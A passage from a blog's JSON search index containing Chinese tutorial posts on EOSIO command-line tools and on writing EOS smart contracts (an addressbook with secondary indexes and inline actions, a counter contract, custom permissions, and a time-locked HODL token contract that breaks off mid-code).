(i32.const 42))))","categories":[],"tags":[{"name":"区块链安全之WebAssembly","slug":"区块链安全之WebAssembly","permalink":"https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BWebAssembly/"}],"keywords":[]},{"title":"区块链安全之EOSIO相关工具的使用","slug":"区块链安全之EOSIO相关工具的使用","date":"2021-03-20T07:17:15.000Z","updated":"2021-03-21T10:45:43.817Z","comments":true,"path":"2021/03/20/区块链安全之EOSIO相关工具的使用/","link":"","permalink":"https://ggyggy666.github.io/2021/03/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOSIO%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"先前已经学会了编写智能合约并编译部署，但对于使用到的工具比如nodeos, cleos并不熟悉，因此学习一下。 来源:https://developers.eos.io/manuals/eos/latest/nodeos/index","text":"先前已经学会了编写智能合约并编译部署，但对于使用到的工具比如nodeos, cleos并不熟悉，因此学习一下。 来源:https://developers.eos.io/manuals/eos/latest/nodeos/index nodeosnodeos是在每个EOSIO节点上运行的核心服务守护程序，可以配置为处理智能合约，验证交易，产生包含有效交易的区块，确认区块并将其记录在区块链上。 nodeos主要是加载插件，选项有nodeos特定的以及插件特定的。 nodeos特定的选项 用于内部管理。可以使用nodeos --help可以看到特定于nodeos的选项。 插件特定的选项 用于控制nodeos插件，每个插件有唯一名称，因此可以–plugin指定它。有些插件固定：chain_plugin, net_plugin, producer_plugin。有两种配置方法： 123451.config.iniplugin &#x3D; eosio::net_api_plugin2.clinodeos ... --plugin eosio::net_api_plugin cleos命令行工具，可以用来部署和测试智能合约。需要先启动Nodeos实例，而且实例配置为：eosio::chain_api_plugin在启动时加载插件。 1cleos --help -u, 指定nodeos运行的ip和端口。 –wallet-url, 指定keosd运行的URL -r, 传递http头部 -n, 使用HTTPS时不验证证书。 –no-auto-keosd，keosd没有运行时不自动加载。 -v, 输出详细的错误和action信息 –print-request, 打印HTTP请求 –print-response, 打印HTTP响应 version, 返回版本信息。cleos version, cleos version client create, 创建各种项目，打开和关闭区块链 convert, 打包或者卸载交易 get，返回各种关于区块链的信息 set, 设置或者更新区块链状态 transfer, 在账户之间传送token net, 与本地的p2p网络连接交互 wallet，与本地钱包交互 sign, 给一个交易签名 push，推送任意的交易到区块链 multisig, 对合约命令多重签名 wrap, 包装合约命令 system, 发送eosio.system 合约action到区块链 还有子命令的帮助信息，如： 1cleos create --help 查看create子命令的信息。返回 12key, 创建密钥打印公钥和私钥。account, 创建新的账户。 然后继续查询子命令帮助信息 1cleos create account --help 返回一堆信息，自己看就是了。 示例创建钱包 12345#-n后是钱包名字，--to-console是将钱包密码显示在屏幕cleos wallet create -n mywallet --to-console#-f后是文件名，将密码保存到文件中cleos wallet create -n mywallet -f default_wallet.pwd 为账户购买0.1SYStoken的RAM 1cleos system buyram alice alice &quot;0.1SYS&quot; -p alice@active 配置多重签名账户 1cleos set account permission multisig active &#39;&#123;\\&quot;threshold\\&quot; : 1, \\&quot;accounts\\&quot; :[&#123;\\&quot;permission\\&quot;:&#123;\\&quot;actor\\&quot;:\\&quot;eosio\\&quot;,\\&quot;permission\\&quot;:\\&quot;active\\&quot;&#125;,\\&quot;weight\\&quot;:1&#125;,&#123;\\&quot;permission\\&quot;:&#123;\\&quot;actor\\&quot;:\\&quot;customera\\&quot;,\\&quot;permission\\&quot;:\\&quot;active\\&quot;&#125;,\\&quot;weight\\&quot;:1&#125;]&#125;&#39; owner -p multisig@owner&quot; 连接到特定nodeos或keosd 使用–url或–wallet-url, 不过不加参数就默认连接到127.0.0.1:8888 1234#nodeoscleos -url http:&#x2F;&#x2F;nodeos-host:8888 命令#keosdcleos --wallet-url http:&#x2F;&#x2F;keosd-host:8888 命令 创建账户 1cleos create account creator name OwnerKey [ActiveKey] 创建密钥对 1234#将密钥输出到控制台cleos create key --to-console#保存到文件cleos create key --file xxx 分配CPU资源 1cleos system delegatebw bob alice &quot;0 SYS&quot; &quot;0.01 SYS&quot; bob给alice分配资源，0 SYS的网络带宽，0.01 SYS的CPU带宽。 分配带宽 1cleos system delegatebw bob alice \"0.01 SYS\" \"0 SYS\" 部署智能合约 1cleos set contract contract_account contract_folder [wasm-file] [abi-file] 获取账户信息 1cleos get account 账户名 获取区块信息 1cleos get block 区块号或ID 获取表信息 1cleos get table 账户 SCOPE TABLE 获取交易信息 1cleos get transaction 交易id 导入密钥 1cleos wallet import 然后输入密钥即可。 链接权限 1cleos set action permission alice hodlcontract transfer permlvl 将权限链接permlvl到actionhodlcontract合约的transfer行为 列出所有密钥对 123456#解锁钱包cleos wallet unlock#列出公钥和私钥cleos wallet keyscleos wallet private_keys 占用网络带宽 1cleos system delegatebw alice alice &quot;0 SYS&quot; &quot;0.01 SYS&quot; 提交交易 创建一个有效交易的JSON代码 12345678910111213141516171819202122&#123; &quot;expiration&quot;: &quot;2019-08-01T07:15:49&quot;, &quot;ref_block_num&quot;: 34881, &quot;ref_block_prefix&quot;: 2972818865, &quot;max_net_usage_words&quot;: 0, &quot;max_cpu_usage_ms&quot;: 0, &quot;delay_sec&quot;: 0, &quot;context_free_actions&quot;: [], &quot;actions&quot;: [&#123; &quot;account&quot;: &quot;eosio.token&quot;, &quot;name&quot;: &quot;transfer&quot;, &quot;authorization&quot;: [&#123; &quot;actor&quot;: &quot;han&quot;, &quot;permission&quot;: &quot;active&quot; &#125; ], &quot;data&quot;: &quot;000000000000a6690000000000ea305501000000000000000453595300000000016d&quot; &#125; ], &quot;transaction_extensions&quot;: [], &quot;context_free_data&quot;: []&#125; 提交 1cleos push transaction xxx.json 通过JSON提交 1cleos push transaction JSON 转移token 1cleos transfer alice bob &quot;0.0001 SYS&quot; &quot;Hodl!&quot; -p alice@active 将0.0001 SYS的token从alice转移到bob 取消删除CPU资源 1cleos system undelegatebw bob alice &quot;0 SYS&quot; &quot;0.01 SYS&quot; 将0.01 SYSCPU带宽从alice返回到bob.网络带宽类似。 删除链接的权限基本 1cleos set action permission alice hodlcontract transfer NULL 删除一个链接到hodlcontract合约的transfer行为的权限。 取消CPU 1cleos system undelegatebw alice alice &quot;0.01 SYS&quot; &quot;0 SYS&quot; 投票 1cleos system voteproducer prods eosiotestts2 blockproducer1 blockproducer2 从eosiotestts2账户向blockproducer1和blockproducer2投票","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}],"tags":[{"name":"区块链安全之EOSIO相关工具的使用","slug":"区块链安全之EOSIO相关工具的使用","permalink":"https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOSIO%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"}],"keywords":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}]},{"title":"区块链安全之EOS学习（三）","slug":"区块链安全之EOS学习（三）","date":"2021-03-18T04:13:02.000Z","updated":"2021-03-19T09:09:48.504Z","comments":true,"path":"2021/03/18/区块链安全之EOS学习（三）/","link":"","permalink":"https://ggyggy666.github.io/2021/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"上一篇讲到了对合约创建表，修改和删除表中记录。本次则显示如何持久存储合约使用的数据以及创建许多索引来访问该数据。","text":"上一篇讲到了对合约创建表，修改和删除表中记录。本次则显示如何持久存储合约使用的数据以及创建许多索引来访问该数据。 二级索引EOSIO能按最多16个索引来对表进行排序。 删除表中现有数据12cleos push action addressbook erase &#39;[&quot;alice&quot;]&#39; -p alice@activecleos push action addressbook erase &#39;[&quot;bob&quot;]&#39; -p bob@active 删除之前添加的alice和bob的记录。 添加新的索引成员及其获取器12uint64_t age;uint64_t get_secondary_1() const &#123;return age;&#125; 之前是用key作为唯一主键，现在使用一个age（数字字段）作为二级索引，然后使用get_secondary_1函数来返回这个age。 添加辅助索引到addresses表配置1using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person, indexed_by&lt;&quot;byage&quot;_n,const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt;&gt;; 在第三个结构中，传递了一个indexed_by用于实例化索引的结构。index名称是byage, 第二个类型参数是函数调用运算符，该函数将const值提取为索引键。将其指向我们先前创建的get_secondary_1，以便此多索引表将按age变量对记录进行索引。 修改upsert程序upsert参数值增加一个age, 之后初始化的时候也增加一个row.age = age即可。 编译/部署12eosio-cpp --abigen addressbook.cpp -o addressbook.wasm &#x2F;&#x2F;编译cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook &#x2F;&#x2F;部署 测试插入alice和bob的记录 123cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, 9, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@activecleos push action addressbook upsert &#39;[&quot;bob&quot;, &quot;bob&quot;, &quot;is a guy&quot;, 49, &quot;doesnt exist&quot;, &quot;somewhere&quot;, &quot;someplace&quot;]&#39; -p bob@active 通过年龄age索引来查找alice的地址，–index 2参数用于表示使用二级索引查询。 123456cleos get table addressbook addressbook people --upper 10 \\--key-type i64 \\--index 2&#x2F;&#x2F;按bob的年龄cleos get table addressbook addressbook people --upper 50 --key-type i64 --index 2 最终完整合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;eosio/eosio.hpp&gt;#include &lt;eosio/print.hpp&gt;using namespace eosio;class [[eosio::contract(\"addressbook\")]] addressbook : public eosio::contract &#123;public: addressbook(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void upsert(name user, std::string first_name, std::string last_name, uint64_t age, std::string street, std::string city, std::string state) &#123; require_auth( user ); address_index addresses(get_first_receiver(),get_first_receiver().value); auto iterator = addresses.find(user.value); if( iterator == addresses.end() ) &#123; addresses.emplace(user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; &#125;); &#125; else &#123; addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; &#125;); &#125; &#125; [[eosio::action]] void erase(name user) &#123; require_auth(user); address_index addresses(get_self(), get_first_receiver().value); auto iterator = addresses.find(user.value); check(iterator != addresses.end(), \"Record does not exist\"); addresses.erase(iterator); &#125;private: struct [[eosio::table]] person &#123; name key; std::string first_name; std::string last_name; uint64_t age; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123; return key.value; &#125; uint64_t get_secondary_1() const &#123; return age; &#125; &#125;; using address_index = eosio::multi_index&lt;\"people\"_n, person, indexed_by&lt;\"byage\"_n, const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt;&gt;;&#125;; 添加内联操作从合约调用内联操作。首先得构造出这些action，然后从合约中发送这些action。其实就是在执行一些操作后，发送一些通知消息，比如成功修改记录这些. 将eosio.code添加到权限将eosio.code权限添加到合同账户的合同权限 1cleos set account permission addressbook active --add-code 授权后才能使合同执行内联操作。 通知action在之前的addressbook类中创建一个辅助函数 12[[eosio::action]]void notify(name user, std::string msg)&#123;&#125; user表示是通知哪个用户，msg表示发送的消息。 需要将用户添加到require_recipient中，然后要求发送消息是给require_recipient中的用户。 1require_recipient(user); 然后这样任何用户都可以调用这个Notify函数，因此需要确保是合约自身调用的 1require_auth(get_self()); 如果bob用户传参alice会发生异常。 action构造器内联操作会被多次调用，因此最好编写快速构造器。 123456789private: void send_summary(name user, std::string message)&#123; action( permission_level&#123;get_self(), &quot;active&quot;_n&#125;, get_self(), &quot;notify&quot;_n, std::make_tuple(user, name&#123;user&#125;.to_string()+message) ).send(); &#125; 该action构造器需要4个参数： permission_level结构：要授权得到许可，应使用active授权机构用来授权get_self()。 调用合约的user：最后就是使用get_self()。 action：使用上面已经创建的notify函数。_n是运算符。 传递的数据：由nofity函数可知，接受两个参数user和message, 而这个action构造器接受byte类型的，因此需要使用make_tuple函数将这两个数据连接起来转成byte类型。 最后发送动作：.send(); 调用 合约部署后： 1send_summary(user, &quot;successfully implaced record to addressbook&quot;); 合约的记录修改后： 1send_summary(user, &quot;successfully modified record in addressbook&quot;); 合约的记录删除后： 1send_summary(user, &quot;successfully erased record from addressbook&quot;); 最终完整合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;eosio/eosio.hpp&gt;#include &lt;eosio/print.hpp&gt;using namespace eosio;class [[eosio::contract(\"addressbook\")]] addressbook : public eosio::contract &#123;public: addressbook(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void upsert(name user, std::string first_name, std::string last_name, uint64_t age, std::string street, std::string city, std::string state) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); if( iterator == addresses.end() ) &#123; addresses.emplace(user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; &#125;); send_summary(user, \" successfully emplaced record to addressbook\"); &#125; else &#123; addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.street = street; row.city = city; row.state = state; &#125;); send_summary(user, \" successfully modified record to addressbook\"); &#125; &#125; [[eosio::action]] void erase(name user) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); check(iterator != addresses.end(), \"Record does not exist\"); addresses.erase(iterator); send_summary(user, \" successfully erased record from addressbook\"); &#125; [[eosio::action]] void notify(name user, std::string msg) &#123; require_auth(get_self()); require_recipient(user); &#125;private: struct [[eosio::table]] person &#123; name key; std::string first_name; std::string last_name; uint64_t age; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123; return key.value; &#125; uint64_t get_secondary_1() const &#123; return age;&#125; &#125;; void send_summary(name user, std::string message) &#123; action( permission_level&#123;get_self(),\"active\"_n&#125;, get_self(), \"notify\"_n, std::make_tuple(user, name&#123;user&#125;.to_string() + message) ).send(); &#125;; typedef eosio::multi_index&lt;\"people\"_n, person, indexed_by&lt;\"byage\"_n, const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt; &gt; address_index;&#125;; 编译/部署12345cd &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbookeosio-cpp -o addressbook.wasm addressbook.cpp --abigencleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook 测试1cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, 21, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@active 增加一条alice记录, 但是出错了！ 1234Error 3050003: eosio_assert_message assertion failureError Details:assertion failure with message: readpending console output: 于是换了一个账户就行了。。。 1cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;addressbook&quot;, &quot;liddell&quot;, 21, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p addressbook@active 成功增加一条记录 1cleos get actions addressbook 显示已执行的与addressbook相关的action。 对外部合约的内联操作上面是对合约内部的操作，接下来是对外部合约的操作。 创建外部合约1234cd /home/ggy/桌面/blockchain/contractsmkdir abcountercd abcountertouch abcounter.cpp vim打开后，输入以下合约代码保存： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;eosio/eosio.hpp&gt;using namespace eosio;class [[eosio::contract(\"abcounter\")]] abcounter : public eosio::contract &#123; public: abcounter(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void count(name user, std::string type) &#123; require_auth( name(\"addressbook\")); //限制只能addressbook合约调用 count_index counts(get_first_receiver(), get_first_receiver().value); auto iterator = counts.find(user.value); if (iterator == counts.end()) &#123; counts.emplace(\"addressbook\"_n, [&amp;]( auto&amp; row ) &#123; row.key = user; row.emplaced = (type == \"emplace\") ? 1 : 0; row.modified = (type == \"modify\") ? 1 : 0; row.erased = (type == \"erase\") ? 1 : 0; &#125;); &#125; else &#123; counts.modify(iterator, \"addressbook\"_n, [&amp;]( auto&amp; row ) &#123; if(type == \"emplace\") &#123; row.emplaced += 1; &#125; if(type == \"modify\") &#123; row.modified += 1; &#125; if(type == \"erase\") &#123; row.erased += 1; &#125; &#125;); &#125; &#125; //动作包装器，第一个参数是要调用的动作，第二个则是指向动作函数 using count_action = action_wrapper&lt;\"count\"_n, &amp;abcounter::count&gt;; private: struct [[eosio::table]] counter &#123; name key; uint64_t emplaced; uint64_t modified; uint64_t erased; uint64_t primary_key() const &#123; return key.value; &#125; &#125;; using count_index = eosio::multi_index&lt;\"counts\"_n, counter&gt;;&#125;; 创建合约账户1cleos create account eosio abcounter EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC 创建abcounter账户 编译/部署123eosio-cpp abcounter.cpp -o abcounter.wasmcleos set contract abcounter &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;abcounter 修改addressbook合约这是为了通过修改addressbook合约来执行对外部合约的调用操作。 在private中创建一个合约声明： 1234void increment_counter(name user, std::string type)&#123; abcounter::count_action count(&quot;abcounter&quot;_n, &#123;get_self(), &quot;active&quot;_n&#125;); count.send(user, type);&#125; 使用的是count_action动作包装器，初始化了count_action对象。 第一个参数是合同名称abcounter 第二个参数是权限结构：get_self()是当前addressbook合约，使用active许可该合约。 不需要额外指定action，因为动作包装前已经在定义action时合并了action。 接下来将increment_counter应用在每一个action。 123456&#x2F;&#x2F;Emplaceincrement_counter(user, &quot;emplace&quot;);&#x2F;&#x2F;Modifyincrement_counter(user, &quot;modify&quot;);&#x2F;&#x2F;Eraseincrement_counter(user, &quot;erase&quot;); 最终合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;eosio/eosio.hpp&gt;#include \"abcounter.cpp\"using namespace eosio;class [[eosio::contract(\"addressbook\")]] addressbook : public eosio::contract &#123;public: addressbook(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void upsert(name user, std::string first_name, std::string last_name, uint64_t age, std::string street, std::string city, std::string state) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); if( iterator == addresses.end() ) &#123; addresses.emplace(user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; &#125;); send_summary(user, \" successfully emplaced record to addressbook\"); increment_counter(user, \"emplace\"); &#125; else &#123; std::string changes; addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; &#125;); send_summary(user, \" successfully modified record to addressbook\"); increment_counter(user, \"modify\"); &#125; &#125; [[eosio::action]] void erase(name user) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); check(iterator != addresses.end(), \"Record does not exist\"); addresses.erase(iterator); send_summary(user, \" successfully erased record from addressbook\"); increment_counter(user, \"erase\"); &#125; [[eosio::action]] void notify(name user, std::string msg) &#123; require_auth(get_self()); require_recipient(user); &#125;private: struct [[eosio::table]] person &#123; name key; std::string first_name; std::string last_name; uint64_t age; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123; return key.value; &#125; uint64_t get_secondary_1() const &#123; return age;&#125; &#125;; void send_summary(name user, std::string message) &#123; action( permission_level&#123;get_self(),\"active\"_n&#125;, get_self(), \"notify\"_n, std::make_tuple(user, name&#123;user&#125;.to_string() + message) ).send(); &#125;; void increment_counter(name user, std::string type) &#123; abcounter::count_action count(\"abcounter\"_n, &#123;get_self(), \"active\"_n&#125;); count.send(user, type); &#125; typedef eosio::multi_index&lt;\"people\"_n, person, indexed_by&lt;\"byage\"_n, const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt; &gt; address_index;&#125;; 重新编译/部署123eosio-cpp -o addressbook.wasm addressbook.cpp -I ..&#x2F;abcounter&#x2F;cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook 测试alice账户都出错了。。因此之后都是替换成addressbook账户才行。 1cleos push action addressbook upsert '[\"addressbook\", \"alice\", \"liddell\", 19, \"123 drink me way\", \"wonderland\", \"amsterdam\"]' -p addressbook@active 可以看到计数器已经成功通知。接着检查表 1cleos get table abcounter abcounter counts --lower addressbook --limit 1 测试每个action并检查计数器。 upsert修改记录 1cleos push action addressbook upsert '[\"addressbook\", \"alice\", \"liddell\", 21,\"1 there we go\", \"wonderland\", \"amsterdam\"]' -p addressbook@active erase删除记录（这个又出错了） 1cleos push action addressbook erase '[\"addressbook\"]' -p addressbook@active 直接调用abcounter合约来操纵数据 1cleos push action abcounter count '[\"addressbook\", \"erase\"]' -p addressbook@active 增加更多信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#include &lt;eosio/eosio.hpp&gt;#include \"abcounter.cpp\"using namespace eosio;class [[eosio::contract(\"addressbook\")]] addressbook : public eosio::contract &#123;public: addressbook(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void upsert(name user, std::string first_name, std::string last_name, uint64_t age, std::string street, std::string city, std::string state) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); if( iterator == addresses.end() ) &#123; addresses.emplace(user, [&amp;]( auto&amp; row )&#123; row.key = user; row.first_name = first_name; row.last_name = last_name; row.age = age; row.street = street; row.city = city; row.state = state; send_summary(user, \" successfully emplaced record to addressbook\"); increment_counter(user, \"emplace\"); &#125;); &#125; else &#123; std::string changes; addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123; if(row.first_name != first_name) &#123; row.first_name = first_name; changes += \"first name \"; &#125; if(row.last_name != last_name) &#123; row.last_name = last_name; changes += \"last name \"; &#125; if(row.age != age) &#123; row.age = age; changes += \"age \"; &#125; if(row.street != street) &#123; row.street = street; changes += \"street \"; &#125; if(row.city != city) &#123; row.city = city; changes += \"city \"; &#125; if(row.state != state) &#123; row.state = state; changes += \"state \"; &#125; &#125;); if(!changes.empty()) &#123; send_summary(user, \" successfully modified record in addressbook. Fields changed: \" + changes); increment_counter(user, \"modify\"); &#125; else &#123; send_summary(user, \" called upsert, but request resulted in no changes.\"); &#125; &#125; &#125; [[eosio::action]] void erase(name user) &#123; require_auth(user); address_index addresses(get_first_receiver(), get_first_receiver().value); auto iterator = addresses.find(user.value); check(iterator != addresses.end(), \"Record does not exist\"); addresses.erase(iterator); send_summary(user, \" successfully erased record from addressbook\"); increment_counter(user, \"erase\"); &#125; [[eosio::action]] void notify(name user, std::string msg) &#123; require_auth(get_self()); require_recipient(user); &#125;private: struct [[eosio::table]] person &#123; name key; std::string first_name; std::string last_name; uint64_t age; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123; return key.value; &#125; uint64_t get_secondary_1() const &#123; return age;&#125; &#125;; void send_summary(name user, std::string message) &#123; action( permission_level&#123;get_self(),\"active\"_n&#125;, get_self(), \"notify\"_n, std::make_tuple(user, name&#123;user&#125;.to_string() + message) ).send(); &#125;; void increment_counter(name user, std::string type) &#123; action counter = action( permission_level&#123;get_self(),\"active\"_n&#125;, \"abcounter\"_n, \"count\"_n, std::make_tuple(user, type) ); counter.send(); &#125; typedef eosio::multi_index&lt;\"people\"_n, person, indexed_by&lt;\"byage\"_n, const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt;&gt; address_index;&#125;; 创建和使用自定义账户权限首先需要拥有一个父权限，才能自定义权限，从而控制合约的某些操作。 创建自定义权限1cleos set account permission addressbook upsert EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC owner -p addressbook@owner 创建名为upsert的新权限。 该upsert权限使用开发公钥作为许可。 它建立在alice账户上。 将合约action授权链接到自定义权限1cleos set action permission addressbook addressbook upsert upsert 授权upsert权限链接到addressbook合约的upsert操作。 测试在alice的权限下调用upsert: 1cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;alice&quot;, &quot;liddel&quot;, 21, &quot;Herengracht&quot;, &quot;land&quot;, &quot;dam&quot;]&#39; -p addressbook@active 会发现报错了。使用upsert权限： 1cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;alice&quot;, &quot;liddel&quot;, 21, &quot;Herengracht&quot;, &quot;land&quot;, &quot;dam&quot;]&#39; -p addressbook@upsert 正常执行。 支付action在将token转移时触发的支付操作。 创建HODL代币创建一个hodl类，继承了eosio::contract 123456789#include&lt;eosiolib&#x2F;eosio.hpp&gt;using namespace eosio;class [[eosio::contract(&quot;hodl&quot;)]] hodl:public eosio::contract&#123; private: static const uint32_t the_party &#x3D; 1645525342; &#x2F;&#x2F;将hodl设置为在2022-2-22的晚10:22:22结束 const symbol hodl_symbol; &#x2F;&#x2F;定义一个token符号，即SYS public:&#125; 之后定义一个balance表来跟踪合约收到的token数量 1234struct [[eosio::table]] balance&#123; eosio::asset funds; uint64_t primary_key() const&#123;return funds.symbol.raw();&#125;&#125; 使用了一个新的asset类型，表示数字token资产的类型。symbol资产实例的成员用作主键，通过调用raw()函数，将symbol变量转换为无符号整数。 构造函数将hodl_symbol初始化为SYS 123public: using contract::contract; hodl(name receiver, name code, datastream&lt;const char*&gt;ds):contract(receiver, code, ds), hodl_symbol(&quot;SYS&quot;, 4)&#123;&#125; 创建一个函数来访问当前UTC时间 123uint32_t now()&#123; return current_time_point().sec_since_epoch();&#125; 编写存款action要接受转账，需要进行存款操作。 12345678910111213141516171819202122232425262728[[eosio::on_notify(&quot;eosio.token::transfer&quot;)]]void deposit(name hodler, name to, eosio::asset quantity, std::string memo)&#123;&#x2F;&#x2F;检查不能转给自己 if (to !&#x3D; get_self() || hodler &#x3D;&#x3D; get_self()) &#123; print(&quot;These are not the droids you are looking for.&quot;); return; &#125;&#x2F;&#x2F;检查提款时间未过去 check(now() &lt; the_party, &quot;You&#39;re way late&quot;);&#x2F;&#x2F;转账数量大于0 check(quantity.amount &gt; 0, &quot;When pigs fly&quot;);&#x2F;&#x2F;转账的token使用的是构造函数中指定的SYS check(quantity.symbol &#x3D;&#x3D; hodl_symbol, &quot;These are not the droids you are looking for.&quot;);&#x2F;&#x2F;更新余额 balance_table balance(get_self(), hodler.value); auto hodl_it &#x3D; balance.find(hodl_symbol.raw()); if (hodl_it !&#x3D; balance.end()) balance.modify(hodl_it, get_self(), [&amp;](auto &amp;row) &#123; row.funds +&#x3D; quantity; &#125;); else balance.emplace(get_self(), [&amp;](auto &amp;row) &#123; row.funds &#x3D; quantity; &#125;);&#125; 注意开头的on_notify属性，它是EOSIO.CDT属性之一。用于对action进行注释。确保仅当通知来自于eosio.token合约的transfer操作时，传入的通知才转发到存款操作。eosio.token合约会在转移通知到达hodl的deposit操作之前检查发送者是否有足够的token。 提款token存到hodl合约后，需要提款到账户。 123456789101112131415161718192021222324[[eosio::action]]void party(name hodler)&#123; //Check the authority of hodler require_auth(hodler); //Check the current time has passed the the_party time check(now() &gt; the_party, \"Hold your horses\"); balance_table balance(get_self(), hodler.value); auto hodl_it = balance.find(hodl_symbol.raw()); //Make sure the holder is in the table check(hodl_it != balance.end(), \"You're not allowed to party\"); action&#123; permission_level&#123;get_self(), \"active\"_n&#125;, \"eosio.token\"_n, \"transfer\"_n, std::make_tuple(get_self(), hodler, hodl_it-&gt;funds, std::string(\"Party! Your hodl is free.\")) &#125;.send(); balance.erase(hodl_it);&#125; 检查提款账户是最初进行存款的账户。 找到锁定的余额。 将token从hodl转到账户。 完整合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;eosio/eosio.hpp&gt;#include &lt;eosio/print.hpp&gt;#include &lt;eosio/asset.hpp&gt;#include &lt;eosio/system.hpp&gt;using namespace eosio;class [[eosio::contract(\"hodl\")]] hodl : public eosio::contract &#123; private: static const uint32_t the_party = 1645525342; const symbol hodl_symbol; struct [[eosio::table]] balance &#123; eosio::asset funds; uint64_t primary_key() const &#123; return funds.symbol.raw(); &#125; &#125;; using balance_table = eosio::multi_index&lt;\"balance\"_n, balance&gt;; uint32_t now() &#123; return current_time_point().sec_since_epoch(); &#125; public: using contract::contract; hodl(name receiver, name code, datastream&lt;const char *&gt; ds) : contract(receiver, code, ds),hodl_symbol(\"SYS\", 4)&#123;&#125; [[eosio::on_notify(\"eosio.token::transfer\")]] void deposit(name hodler, name to, eosio::asset quantity, std::string memo) &#123; if (hodler == get_self() || to != get_self()) &#123; return; &#125; check(now() &lt; the_party, \"You're way late\"); check(quantity.amount 